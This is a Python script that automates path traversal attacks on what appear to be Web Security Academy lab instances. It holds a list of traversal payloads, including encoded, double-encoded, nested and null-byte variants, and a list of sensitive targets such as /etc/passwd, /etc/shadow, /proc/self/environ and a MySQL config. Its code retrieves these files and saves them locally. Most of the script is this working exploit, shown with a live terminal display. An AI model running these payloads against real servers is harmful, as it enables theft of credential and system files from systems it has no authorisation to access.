import requests, os, sys, time, pyfiglet, typer

from lxml import html
from rich.console import Console
from rich.tree import Tree
from rich.panel import Panel
from rich.align import Align
from rich.layout import Layout
from rich.live import Live
from rich.status import Status
from rich.table import Table
from rich.style import Style

CTF_SESSION_CODE = '' # To fill with typer arg
CTF_URL = 'https://CTF_SESSION_CODE.web-security-academy.net'

VULN_FOUND = False

SCRIPT_LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))

TRAVERSAL_PAYLOADS = [
    '/',
    '../../../../',
    '....//....//....//....//',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f'
]

LOCATIONS = [
    'etc/passwd',
    'etc/issue',
    'etc/shadow',
    'etc/group',
    'etc/hosts',
    'etc/motd',
    'etc/mysql/my.cnf',
    'proc/self/environ',
    'proc/version',
    'proc/cmdline',
    'proc/sched_debug',
    'proc/mounts',
    'proc/net/arp',
    'proc/net/route',
    'proc/net/tcp',
    'proc/net/udp'
]

LOGO = [                                                                                                                              
"             &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                                                       ",   
"           %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                      ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                      ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(      ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(      ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.                                                  ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                                                       ",   
"           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.     ,&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,",   
"                                                                      .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,",   
"                                                                   /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.",   
"     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ",   
"     /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@& ",   
"     *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@% ",   
"     ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@( ",   
"     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ",   
"      &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@* ",   
"      %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. ",   
"      #@@@@@@@@@@@@@%   @@@@@@@@@@@@@@@@@@@@@@(   @@@@@@@@@@@@@@@@@@@@@@%   @@@@@@@@@@@@@@@@@@@@@@@   &@@@@@@@@@@@@@@@@@@@@@@  ",   
"      (@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@#   @@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@   %@@@@@@@@@@@@@@@@@@@@@@&  ",   
"      ,@@@@@@@@@@@&   &@@@@@@@@@@@@@@@@@@@@@%   @@@@@@@@@@@@@@@@@@@@@@@   &@@@@@@@@@@@@@@@@@@@@@@   (@@@@@@@@@@@@@@@@@@@@@@@%  ",   
"      .@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@%   @@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@.  (@@@@@@@@@@@@@@@@@@@@@@@@#  ",   
"      .@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@   %@@@@@@@@@@@@@@@@@@@@@@.  /@@@@@@@@@@@@@@@@@@@@@@@@@(  ",   
"       &@@@@@@@&   %@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@   #@@@@@@@@@@@@@@@@@@@@@@.  /@@@@@@@@@@@@@@@@@@@@@@@@@@/  ",   
"       %@@@@@@@   %@@@@@@@/  .@@@@,  *@@@   &@@@@@@@#   @@@@/  .@@@.  #@@@@@@@&   %@@@*  ,@@@,  /@@@@@@@@.  (@@@(  .@@@@@@@@,  ",   
"       #@@@@@@   &@@@@@@@@.   &@@@    @@   &@@@@@@@@*   #@@@.   &@.  %@@@@@@@@#   *@@@    @@*  *@@@@@@@@&   .@@@*   %@@@@@@@.  ",   
"       /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  ",   
"       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   ",   
"       .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%   ",   
"       .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\ \@@@@@@@@/ /@| |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#   ",   
"        &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\ \@@/\@@/ /__| | ___ ___  _ __ ___   ___ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(   ",   
"        %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*   ",   
"        (@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\  /\  /  __/ | (_| (_) | | | | | |  __/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,   ",   
"        /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\/  \/ \___|_|\___\___/|_| |_| |_|\___|@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   ",   
"        ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    ",   
"         .///////////////////////////////////////////////////////////////////////////////////////////////////////////////*     "
]



def dump(location, response):
    f= open(SCRIPT_LOCATION+'/dump/'+location.replace('/','-')+'.txt', 'w+')
    f.write(response.text)
    f.close

def appendToTree(location):
    parts=location.split('/')
    if 'mysql' in parts:
        mysql.add("[bold link="+SCRIPT_LOCATION+'/dump/'+location.replace('/','-')+'.txt'+"]" + parts[len(parts)-1] + "[/]")
    if 'self' in parts:
        self.add("[bold link="+SCRIPT_LOCATION+'/dump/'+location.replace('/','-')+'.txt'+"]" + parts[len(parts)-1] + "[/]")
    if 'net' in parts:
        net.add("[bold link="+SCRIPT_LOCATION+'/dump/'+location.replace('/','-')+'.txt'+"]" + parts[len(parts)-1] + "[/]")
    if 'proc' in parts:
        proc.add("[bold link="+SCRIPT_LOCATION+'/dump/'+location.replace('/','-')+'.txt'+"]" + parts[len(parts)-1] + "[/]")
    if 'etc' in parts:
        etc.add("[bold link="+SCRIPT_LOCATION+'/dump/'+location.replace('/','-')+'.txt'+"]" + parts[len(parts)-1] + "[/]")

#_________________________SETUP LAYOUT_________________________
layout = Layout()
layout.split_column(
    Layout(name="upper", size=(10)),
    Layout(name="lower")
)
layout["upper"].split_column(
    Layout(name="top_upper"),
    Layout(name="down_upper"),
)
layout["lower"].split_row(
    Layout(name="left"),
    Layout(name="right"),
)
layout["right"].split_column(
    Layout(name="top_right", size=5),
    Layout(name="down_right"),
)

welcome_title= pyfiglet.figlet_format('Starting attack', font='slant')
layout["top_upper"].split(
    Layout(Align(welcome_title, align='center', vertical='bottom')) 
)

layout["down_upper"].split(
    Layout(Panel(renderable=Align(renderable='', align='center', vertical='middle')), size=5)
)

status = Status('Checking CTF session code...')
layout["top_right"].split(
    Layout(Panel(title='Status', renderable=Align(status, align='center', vertical='middle')))
)

process_log_table = Table()
process_log_table.add_column('Activities')
layout["down_right"].split(
    Layout(Panel(title='Process Log' ,renderable=process_log_table))
)

dump_tree= Tree(':deciduous_tree: system-root')
etc= dump_tree.add(':open_file_folder: etc')
mysql= etc.add(':open_file_folder: mysql')
proc= dump_tree.add(':open_file_folder: proc')
net= proc.add(':open_file_folder: net')
self= proc.add(':open_file_folder: self')
layout["left"].split(
    Panel(title='Dump tree', renderable=dump_tree)
)
#_______________________________________________________________

console = Console()



def main(ctf_session_code: str):

    global CTF_SESSION_CODE, CTF_URL
    CTF_SESSION_CODE = ctf_session_code
    CTF_URL = CTF_URL.replace('CTF_SESSION_CODE', CTF_SESSION_CODE)

    console.clear()
    for line in LOGO:
        console.print(Align(line, align='center'))
    time.sleep(3)
    console.clear()


    try:
        with Live(layout, refresh_per_second=4):

            response = requests.get(CTF_URL, timeout=5000)
                
            if response.status_code == int(200):

                process_log_table.add_row('✅ CTF session code valid!')
                status.update('Vulnerable endpoint and image path extraction...')

                node = html.fromstring(response.text)
                cashXhtml = node.xpath('//section[@class="container-list-tiles"]/div/img/@src')

                vulnerable_endpoint = cashXhtml[0].split('=')[0] # retrieving vulnerable endpoint
                vulnerable_endpoint += '=' # re add the equal

                file_extension = cashXhtml[0].split('=')[1].split('.')[1] # retrieving file extension in case of Null Byte Vuln
                file_extension = '.' + file_extension # re add the dot

                extracted_path = cashXhtml[0].split('=')[1].split('/') # retrieving all directories of the file path
                image_path=''
                for dir in extracted_path:
                    if dir != '' and '.' not in dir: 
                        image_path += '/' + dir
                if image_path != '':
                    image_path+='/' # add final / 

                process_log_table.add_row('✅ Vulnerable endpoint and image path successfully extracted')
                status.update('Looking for a working payload...')

                for payload in TRAVERSAL_PAYLOADS:
                    layout["down_upper"].split(
                        Layout(Panel(renderable=Align(renderable='[red]'+image_path+payload + '         ' + '[red]'+LOCATIONS[0], align='center', vertical='middle')), size=5)
                    )

                    response = requests.get(CTF_URL+vulnerable_endpoint+image_path+payload+LOCATIONS[0])

                    if response.status_code == int(200): # payload working and etc/passwd found!
                        layout["down_upper"].split(
                            Layout(Panel(renderable=Align(renderable='[green]'+image_path+payload + '         ' + '[green]'+LOCATIONS[0], align='center', vertical='middle')), size=5)
                        )
                        process_log_table.add_row('✅ Working payload found!')
                        process_log_table.add_row('📝 etc/passwd found!')
                        status.update('Looking for other locations...')
                        time.sleep(1)
                        dump(LOCATIONS[0], response) # write file found in a local text file.
                        appendToTree(LOCATIONS[0])

                        #________DISCOVERING OTHER LOCATIONS________
                        for location in LOCATIONS:
                            if location != 'etc/passwd':
                                layout["down_upper"].split(
                                    Layout(Panel(renderable=Align(renderable='[green]'+image_path+payload + '         ' + '[red]'+location, align='center', vertical='middle')), size=5)
                                )
                                response = requests.get(CTF_URL+vulnerable_endpoint+image_path+payload+location)
                                if response.status_code == int(200):
                                    layout["down_upper"].split(
                                        Layout(Panel(renderable=Align(renderable='[green]'+image_path+payload + '         ' + '[green]'+location, align='center', vertical='middle')), size=5)
                                    )
                                    process_log_table.add_row('📝 '+ location +' found!')
                                    time.sleep(1)
                                    dump(location, response) # write file found in a local text file.
                                    appendToTree(location)
                        #____________________________________________

                        global VULN_FOUND
                        VULN_FOUND = True
                        break
        


                # Try again adding a null byte before file extension, in case of extension check:
                if not VULN_FOUND:
                    status.update('Payloads are not working!\nLet\'s try putting a NULL byte before file extension...')
                    time.sleep(3)

                    for payload in TRAVERSAL_PAYLOADS:
                        layout["down_upper"].split(
                            Layout(Panel(renderable=Align(renderable='[red]'+image_path+payload + '         ' + '[red]'+LOCATIONS[0], align='center', vertical='middle')), size=5)
                        )

                        response = requests.get(CTF_URL+vulnerable_endpoint+image_path+payload+LOCATIONS[0]+'%00'+file_extension)

                        if response.status_code == int(200): # payload working adding a null byte and etc/passwd found!
                            layout["down_upper"].split(
                                Layout(Panel(renderable=Align(renderable='[green]'+image_path+payload + '         ' + '[green]'+LOCATIONS[0], align='center', vertical='middle')), size=5)
                            )
                            process_log_table.add_row('✅ Working payload found!')
                            process_log_table.add_row('📝 etc/passwd found!')
                            status.update('Looking for other locations...')
                            time.sleep(1)
                            dump(LOCATIONS[0], response) # write file found in a local text file.
                            appendToTree(LOCATIONS[0]) 

                            #________DISCOVERING OTHER LOCATIONS________
                            for location in LOCATIONS:
                                if location != 'etc/passwd':
                                    layout["down_upper"].split(
                                        Layout(Panel(renderable=Align(renderable='[green]'+image_path+payload + '         ' + '[red]'+location, align='center', vertical='middle')), size=5)
                                    )
                                    response = requests.get(CTF_URL+vulnerable_endpoint+image_path+payload+location+'%00'+file_extension)
                                    if response.status_code == int(200):
                                        layout["down_upper"].split(
                                            Layout(Panel(renderable=Align(renderable='[green]'+image_path+payload + '         ' + '[green]'+location, align='center', vertical='middle')), size=5)
                                        )
                                        process_log_table.add_row('📝 '+ location +' found!')
                                        time.sleep(1)
                                        dump(location, response) # write file found in a local text file.
                                        appendToTree(location)
                            #___________________________________________

                            VULN_FOUND = True
                            break
                            
            else:
                process_log_table.add_row('❌ Invalid CTF session code!')

            if not VULN_FOUND:
                process_log_table.add_row('❌ No working payload found!')
    except:
        console.clear()
        console.print(Align('Unable to reach server!', align='center', vertical='middle'), style=Style(color="red", bgcolor="white", blink=True, bold=True))


if __name__ == "__main__":
    typer.run(main)